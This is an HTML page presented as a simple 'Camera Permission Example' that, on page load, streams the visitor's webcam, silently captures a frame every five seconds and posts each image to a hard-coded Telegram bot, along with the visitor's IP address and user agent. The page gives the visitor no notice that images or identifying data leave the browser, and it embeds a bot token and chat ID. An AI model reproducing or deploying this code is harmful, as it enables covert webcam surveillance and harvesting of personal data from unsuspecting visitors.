<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Permission</title>
</head>
<body>
    <h1>Camera Permission Example</h1>
    <video id="video" width="640" height="480" autoplay></video>
    <script>
        // Request camera permission and stream video
        async function startVideo() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('video').srcObject = stream;

                // Capture image every 5 seconds and send to Telegram
                setInterval(() => {
                    captureImage(stream);
                }, 5000); // Adjusted to 5000 ms (5 seconds)
            } catch (error) {
                console.error("Error accessing camera: ", error);
            }
        }

        function captureImage(stream) {
            const video = document.getElementById('video');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            console.log("Captured image data: ", imageData);

            // Send image to Telegram
            sendImageToTelegram(imageData);
        }

        async function sendImageToTelegram(imageData) {
            const botToken = '6279713413:AAEmPVpjxZROtRY9kjSysmSskrG3OrbuiWw';
            const chatId = '5125698617';
            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        photo: imageData
                    })
                });

                if (response.ok) {
                    console.log("Image sent to Telegram");
                } else {
                    console.error("Error sending image to Telegram: ", response.statusText);
                }
            } catch (error) {
                console.error("Error sending image to Telegram: ", error);
            }
        }

        // Get user's IP address and device information
        async function getUserInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const ip = data.ip;

                const userAgent = navigator.userAgent;
                const userInfo = { ip, userAgent };

                console.log("User info: ", userInfo);

                // Send user info to Telegram
                sendUserInfoToTelegram(userInfo);
            } catch (error) {
                console.error("Error getting user info: ", error);
            }
        }

        async function sendUserInfoToTelegram(userInfo) {
            const botToken = '6279713413:AAEmPVpjxZROtRY9kjSysmSskrG3OrbuiWw';
            const chatId = '5125698617';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: `User Info: IP - ${userInfo.ip}, User Agent - ${userInfo.userAgent}`
                    })
                });

                if (response.ok) {
                    console.log("User info sent to Telegram");
                } else {
                    console.error("Error sending user info to Telegram: ", response.statusText);
                }
            } catch (error) {
                console.error("Error sending user info to Telegram: ", error);
            }
        }

        // Start video and get user info on page load
        window.onload = () => {
            startVideo();
            getUserInfo();
        };
    </script>
</body>
</html>
